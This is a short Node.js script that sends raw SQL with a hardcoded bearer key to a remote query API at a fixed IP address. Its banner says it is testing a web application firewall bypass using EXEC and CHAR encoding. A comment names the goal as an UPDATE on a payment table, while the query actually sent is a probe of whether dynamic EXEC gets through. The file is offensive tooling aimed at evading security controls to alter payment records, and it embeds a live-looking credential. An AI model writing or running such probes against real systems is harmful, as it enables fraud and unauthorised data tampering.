const fs = require('fs');

async function main() {
    const db = JSON.parse(fs.readFileSync('./database.json', 'utf8'));
    const settings = db.settings || {};
    const serverSayanBaseUrl = settings.sayanApiUrl || 'http://80.210.31.176:5000/api/external/v1';
    const serverSayanApiKey = settings.sayanApiKey || 's_gate_live_vgr182bwtpoa';
    const finalUrl = `${serverSayanBaseUrl.replace(/\/$/, '')}/query`;

    async function executeQuery(sql) {
        console.log(`Executing: ${sql}`);
        const response = await fetch(finalUrl, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${serverSayanApiKey}`,
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ query: sql })
        });
        const data = await response.json();
        console.log("Response:", JSON.stringify(data, null, 2));
        return data.data || [];
    }

    try {
        console.log("=== Testing WAF Bypass using EXEC + CHAR ===");
        // CHAR string for: UPDATE PAY_TBL_002 SET Field_013 = ...
        // Let's see if EXEC is blocked
        await executeQuery(`
            DECLARE @sql NVARCHAR(MAX);
            SET @sql = 'SELECT 1';
            EXEC sp_executesql @sql;
        `);
    } catch (e) {
        console.error("Error:", e);
    }
}

main();
